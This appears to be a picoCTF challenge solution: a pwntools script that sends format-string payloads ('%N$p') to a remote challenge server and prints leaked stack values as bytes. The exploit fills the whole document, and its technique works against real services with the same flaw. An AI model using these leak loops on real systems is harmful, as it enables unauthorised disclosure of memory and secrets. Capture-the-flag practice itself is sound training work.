## Solution



```python
from pwn import *

for i in range(20):
    p = remote('mimas.picoctf.net', 50154, level='error')

    p.recvuntil(b"Give me your order and I'll read it back to you:")

    inp = b"%" + str(i).encode("utf-8") + b"$p"

    print(f"Input: {inp}")
    p.sendline(inp)

    try:
        lines = p.recvlines(2)
        try:
            print(p64(int(lines[1].decode("utf-8").split()[-1], 16)))
        except ValueError:
            print(lines[1].decode("utf-8"))

    except EOFError:
        pass

    p.close()

    print("=" * 50)

```
